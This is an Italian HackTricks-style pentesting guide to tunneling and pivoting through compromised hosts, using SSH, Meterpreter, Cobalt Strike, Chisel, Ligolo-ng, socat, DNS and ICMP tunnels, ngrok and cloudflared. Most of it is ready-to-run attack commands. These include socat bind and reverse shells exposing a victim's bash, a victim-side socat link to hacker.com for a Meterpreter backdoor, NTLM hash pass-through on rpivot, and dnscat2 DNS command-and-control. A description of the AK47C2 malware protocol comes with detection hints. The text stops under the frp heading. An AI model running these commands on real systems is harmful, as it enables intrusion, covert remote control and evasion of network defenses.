# Tunneling e Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Suggerimento su Nmap

> [!WARNING]
> Il supporto proxy di Nmap è limitato alle connessioni TCP e non influisce sulle scansioni di ping, delle porte o di rilevamento del sistema operativo. Quando lo scanner si trova dietro un proxy SOCKS, **disabilita il rilevamento degli host** (`-Pn`) e usa una **scansione TCP connect** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Il comando finale usa le opzioni `-u` e `-i` di Evil-WinRM per identificare l'account e l'host WinRM; la porta WinRM predefinita è 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH può inoltrare connessioni X11, porte TCP arbitrarie e socket di dominio Unix tramite il suo canale crittografato.<sup>[[6]](#references)</sup>

Connessione grafica SSH (X)

`-Y` abilita l'inoltro X11 trusted e `-C` richiede la compressione dei dati inoltrati.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Apri una nuova porta nel server SSH --> Altra porta

Il remote forwarding (`-R`) è in ascolto sul server SSH e si connette al lato locale; l'indirizzo di bind esplicito controlla quali interfacce possono raggiungere quel listener.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Porta locale --> Host compromesso (SSH) --> Third_box:Port

Il forwarding locale (`-L`) ascolta sul client e si connette alla destinazione dal lato del server SSH.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Porta locale --> Host compromesso (SSH) --> Ovunque

Il forwarding dinamico (`-D`) crea un listener SOCKS4/SOCKS5 locale, le cui connessioni vengono aperte dal lato remoto.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Questo è utile per ottenere reverse shell dagli host interni attraverso una DMZ fino al tuo host:

L'impostazione `GatewayPorts` del server controlla se un remote forward può eseguire il bind oltre il loopback; il valore predefinito è `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Questo esempio basato su root crea dispositivi tunnel su entrambi gli host. Il server deve consentire il forwarding tun e l'account selezionato deve avere accesso al dispositivo tun; `PermitRootLogin yes` è un modo per usare l'account `root` in questo caso.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Abilitare il forwarding sul lato Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Imposta una nuova route sul lato client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 ha aggiunto un'estensione strict-KEX per contrastare l'attacco all'integrità del trasporto iniziale di Terrapin. Aggiornate entrambi i peer quando possibile e seguite le indicazioni del vendor per le implementazioni più vecchie, invece di presumere che un canale inoltrato sia protetto solo in base alla versione.<sup>[[8]](#references)</sup>

## SSHUTTLE

È possibile effettuare il **tunnel** tramite **ssh** di tutto il **traffico** verso una **subnetwork** attraverso un host.\
Ad esempio, inoltrando tutto il traffico diretto a 10.10.10.0/24

`sshuttle` fornisce un proxy trasparente tramite SSH e supporta la selezione delle subnet e l'uso di un comando SSH personalizzato, come mostrato di seguito.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Connettersi con una chiave privata
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Il `portfwd` di Metasploit supporta il forwarding locale e remoto, mentre il modulo proxy SOCKS è pensato per funzionare con le route delle sessioni o `autoroute` e, in questi esempi, è in ascolto sulla porta 1080 per impostazione predefinita.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Porta locale --> Host compromesso (sessione attiva) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Un altro modo:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Il Beacon di Cobalt Strike può inoltrare connessioni SOCKS4a/SOCKS5 tramite un Beacon; `rportfwd` esegue il bind su un host compromesso, mentre `rportfwd_local` avvia la connessione verso la destinazione dal client di Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Apri una porta nel Team Server sulle interfacce che devono instradare il traffico tramite il Beacon.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> In questo caso, la **porta viene aperta sull'host Beacon**, non sul Team Server, e il traffico viene inviato al Team Server e da lì all'host:porta indicato.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Il manuale del reverse-forwarding indica il seguente comportamento:<sup>[[14]](#references)</sup>

- Il reverse port forward di Beacon è progettato per **tunnelizzare il traffico verso il Team Server, non per inoltrarlo tra singole macchine**.
- Il traffico viene **tunnelizzato all'interno del traffico C2 di Beacon**, inclusi i collegamenti P2P.
- Le porte alte generalmente evitano le restrizioni sulle porte privilegiate, ma la policy del sistema operativo target e i listener esistenti continuano ad applicarsi.

### rPort2Port local

> [!WARNING]
> In questo caso, la **porta viene aperta nell'host Beacon**, non nel Team Server, e il **traffico viene inviato al client Cobalt Strike** (non al Team Server) e da lì all'host:porta indicato.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Il progetto fornisce endpoint di web tunnel come `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` e `tunnel.php`; carica un endpoint supportato prima di avviare il proxy locale.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Puoi scaricarlo dalla pagina delle release di [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel trasporta il traffico TCP/UDP su HTTP utilizzando una connessione protetta da SSH; usa build client/server compatibili e verifica la sintassi dei comandi della release selezionata.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

La guida rapida di Ligolo-ng documenta un'interfaccia TUN sul proxy, la validazione dell'impronta digitale del certificato per l'agent e la configurazione delle route per la rete sottoposta a tunneling.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Binding e ascolto dell'Agent

Ligolo-ng può aggiungere listener sull'agent che inoltrano verso un indirizzo lato proxy, e il suo intervallo riservato `240.0.0.0/4` può essere instradato per raggiungere i servizi locali dell'agent.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Accesso alle porte locali dell'Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot avvia il reverse tunnel dalla vittima ed espone un proxy SOCKS4 sull'indirizzo loopback dell'attaccante; il README documenta anche le credenziali del proxy NTLM e le opzioni per gli hash.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot attraverso **proxy NTLM**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat combina tipi di indirizzo come `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` e `PROXY`; gli esempi seguenti combinano questi endpoint documentati.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port attraverso socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter tramite SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
È possibile attraversare un **proxy non autenticato** con il tipo di indirizzo `PROXY` documentato di socat eseguendo questa riga invece dell’ultima nella console della vittima.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Crea i certificati su entrambi i lati: Client e Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Collega la porta SSH locale (22) alla porta 443 dell'host dell'attaccante
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink è lo strumento da riga di comando per le connessioni di PuTTY, con opzioni di SSH forwarding simili a quelle di `ssh`.<sup>[[22]](#references)</sup>

Usa `-P` maiuscolo per la porta SSH. `-pw` viene mantenuto per compatibilità, ma espone la password nell'elenco dei processi; quando possibile, preferisci l'autenticazione tramite chiave o `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Poiché questo binario verrà eseguito sulla vittima ed è un client SSH, apri il servizio e la porta SSH per la connessione inversa; quanto segue usa `-R` per inoltrare una porta accessibile localmente alla macchina dell'attaccante.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Usa un contesto con le autorizzazioni richieste dall'host quando crei o modifichi regole `portproxy` persistenti. Microsoft documenta le forme `v4tov4` di aggiunta, visualizzazione ed eliminazione utilizzate di seguito.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

È necessario avere **accesso RDP al sistema**.\
Scarica:

SocksOverRDP utilizza i Remote Desktop Dynamic Virtual Channels per trasportare una connessione SOCKS5 attraverso una sessione RDP esistente; il plugin client è in ascolto su `127.0.0.1:1080`, mentre il componente server viene eseguito sul target RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo tool utilizza i `Dynamic Virtual Channels` (`DVC`) della funzionalità Remote Desktop Service di Windows. I DVC sono responsabili del **tunneling dei pacchetti attraverso la connessione RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Nel computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Ora possiamo **connetterci** alla **vittima** tramite **RDP** usando **`mstsc.exe`** e dovremmo ricevere un **prompt** che indica che il **plugin SocksOverRDP è abilitato** e che sarà in **ascolto** su **127.0.0.1:1080**.

**Connettiti** tramite **RDP** e carica ed esegui nella macchina della vittima il binary `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Ora, conferma sulla tua macchina (attacker) che la porta 1080 sia in ascolto:
```
netstat -antb | findstr 1080
```
Ora puoi usare [**Proxifier**](https://www.proxifier.com/) per fare passare il traffico attraverso quella porta.<sup>[[26]](#references)</sup>

## Proxify Windows GUI Apps

Puoi fare in modo che le app GUI di Windows navighino attraverso un proxy usando [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
In **Profile -> Proxy Servers** aggiungi l'IP e la porta del server SOCKS.\
In **Profile -> Proxification Rules** aggiungi il nome del programma da proxificare e le connessioni agli IP che vuoi proxificare; le regole di Proxifier possono corrispondere ad applicazioni, host di destinazione e porte.<sup>[[27]](#references)</sup>

## Tunnel through an NTLM proxy

Lo strumento menzionato in precedenza, **Rpivot**, può inoltrare il traffico attraverso un proxy che autentica tramite NTLM. Anche **OpenVPN** può instradare il traffico attraverso uno di questi proxy quando viene configurato con un file di autenticazione e il metodo NTLMv2; si tratta di attraversamento del proxy, non di un bypass dell'autenticazione del proxy.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm esegue l'autenticazione verso proxy NTLM upstream, espone listener locali e può mappare una porta tunnel locale a un servizio di destinazione; i client possono quindi usare quella porta locale.<sup>[[29]](#references)</sup>\
Ad esempio, inoltrare la porta 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Ora, se per esempio imposti il servizio **SSH** sulla vittima in modo che ascolti sulla porta 443, puoi connetterti ad esso tramite la porta 2222 dell’attacker.<sup>[[29]](#references)</sup>\
Potresti anche usare un **meterpreter** che si connette a localhost:443 mentre l’attacker ascolta sulla porta 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) è il toolkit .NET di Microsoft per i reverse proxy. Puoi trovarlo qui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine crea un tunnel IPv4 attraverso query DNS e utilizza interfacce TUN; la configurazione documentata richiede i privilegi necessari per creare tali interfacce su entrambe le estremità.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Il trasporto DNS comporta un overhead maggiore rispetto al TCP diretto ed è generalmente lento; puoi creare una connessione SSH compressa attraverso questo tunnel utilizzando:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Scaricalo da qui**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 stabilisce un canale di command-and-control crittografato tramite DNS; i comandi del server e del client riportati di seguito seguono l'utilizzo documentato.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Puoi usare [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) per eseguire un client dnscat2 in PowerShell; il suo README documenta i parametri di `Start-Dnscat2` mostrati di seguito.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding con dnscat**

Il comando interattivo `listen` di Dnscat2 associa un listener locale a un host e una porta remoti.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Cambiare il DNS di proxychains

Proxychains-ng intercetta dinamicamente le connessioni TCP collegate e non può trasportare UDP o ICMP; il proxying DNS è configurabile, quindi controlla il `proxychains.conf` installato e l'helper del resolver invece di presumere un resolver pubblico fisso. Gli script legacy `proxyresolv` espongono `PROXY_DNS_SERVER` per scegliere il resolver; usa un resolver raggiungibile dal pivot quando sono necessari nomi interni.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnel in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### DNS TXT / HTTP JSON C2 personalizzato (AK47C2)

L'attore Storm-2603 ha creato un **C2 a doppio canale ("AK47C2")** che abusa *solo* del traffico **DNS** in uscita e delle richieste **HTTP POST semplici**: due protocolli raramente bloccati sulle reti aziendali.<sup>[[2]](#references)</sup>

1. **Modalità DNS (AK47DNS)**
• Genera un SessionID casuale di 5 caratteri (ad esempio `H4T14`).
• Anteponе `1` per le *richieste di task* o `2` per i *risultati* e concatena campi diversi (flag, SessionID, nome del computer).
• Ogni campo viene **crittografato con XOR usando la chiave ASCII `VHBD@H`**, codificato in esadecimale e unito con punti, terminando infine con il dominio controllato dall'attaccante:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Le richieste usano `DnsQuery()` per i record **TXT** (e come fallback **MG**).
• Quando la risposta supera 0xFF byte, la backdoor **frammenta** i dati in parti da 63 byte e inserisce i marker:
`s<SessionID>t<TOTAL>p<POS>` in modo che il server C2 possa riordinarle.

2. **Modalità HTTP (AK47HTTP)**
• Costruisce un envelope JSON:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• L'intero blob viene sottoposto a XOR con `VHBD@H` → codificato in esadecimale → inviato nel body di un **`POST /`** con l'header `Content-Type: text/plain`.
• La risposta segue la stessa codifica e il campo `cmd` viene eseguito con `cmd.exe /c <command> 2>&1`.

Note per il Blue Team
• Cerca **query TXT** insolite la cui prima label sia esadecimale lunga e che terminino sempre con lo stesso dominio raro.
• Una chiave XOR costante seguita da ASCII-hex è facile da rilevare con YARA: `6?56484244?484` (`VHBD@H` in esadecimale).
• Per HTTP, segnala i body delle richieste POST `text/plain` che contengono esclusivamente esadecimali e hanno una lunghezza multipla di due byte.

{{#note}}
Il canale mantiene ogni label del sottodominio entro il limite DNS di 63 ottetti, ma la conformità al protocollo non lo rende di per sé furtivo; i domini rari, le label esadecimali lunghe e il volume delle query rimangono segnali di rilevamento.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## Tunneling ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans documenta un tunnel IPv4-over-ICMP che usa un dispositivo TUN e richieste echo ICMP; la configurazione richiede privilegi sufficienti per creare l'interfaccia.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Scaricalo da qui**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng trasporta connessioni TCP tramite ICMP e utilizza le opzioni `-p`, `-l`, `-r` e `-R` mostrate di seguito rispettivamente per il proxy, il listener locale, l'host di destinazione e la porta di destinazione.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) è un agent che rende accessibili online i servizi di rete locali tramite un tunnel sicuro; la sua CLI documenta gli endpoint HTTP, TCP e file URL, e il nome host dell'endpoint visualizzato può variare in base all'endpoint e all'account.<sup>[[39]](#references)</sup>

### Installazione

- Crea un account: https://ngrok.com/signup
- Download del client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Utilizzi di base

**Documentazione:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_The agent supporta anche opzioni di autenticazione e TLS quando necessario.<sup>[[39]](#references)</sup>_

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Esporre file con HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing delle chiamate HTTP

_Utile per XSS,SSRF,SSTI ..._\
L'agent standalone espone la propria interfaccia di ispezione HTTP su `http://127.0.0.1:4040` per impostazione predefinita; l'interfaccia è destinata al traffico HTTP.<sup>[[40]](#references)</sup>

#### Tunneling del servizio HTTP interno

L'opzione `--host-header=rewrite` riscrive l'header HTTP `Host` upstream in modo che corrisponda al servizio locale.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Esempio di configurazione semplice di ngrok.yaml

Utilizza ngrok Agent Config v2; i tunnel denominati usano `proto` e `addr` e vengono avviati con `ngrok start`.<sup>[[42]](#references)</sup> Apre 3 tunnel:

- 2 TCP
- 1 HTTP con esposizione di file statici da /tmp/httpbin/
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Il connector `cloudflared` di Cloudflare Tunnel stabilisce connessioni in uscita; le applicazioni pubblicate possono instradare HTTP, HTTPS, TCP, SSH e RDP, mentre i quick tunnel sono pensati per lo sviluppo HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### Origine SOCKS5 (modalità legacy)

Il flag legacy `--socks5` indica a `cloudflared` che l'origine locale comunica tramite SOCKS5; non crea un listener SOCKS5 locale. Per un tunnel gestito, `originRequest.proxyType: socks` configura la gestione dell'origine SOCK5.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Tunnel persistenti con DNS

La configurazione del tunnel gestita localmente utilizza le chiavi `tunnel`, `credentials-file` e `url` in minuscolo, come mostrato di seguito.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Avvia il connettore:
```bash
cloudflared tunnel run mytunnel
```
Il connector stabilisce connessioni in uscita e, per impostazione predefinita, negozia QUIC con fallback a HTTP/2; non presumere che ogni deployment utilizzi TCP/443. Eseguilo con solo i privilegi richiesti dal tuo deployment.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) è un reverse proxy Go che supporta **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX e XTCP**. XTCP utilizza il P2P hole punching, il cui successo dipende dal NAT. A partire dalla **v0.53.0**, può funzionare come **SSH Tunnel Gateway**, consentendo a un target host di utilizzare il client OpenSSH standard senza un binario `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Tunnel TCP reverse classico
```bash
# Attacker / server
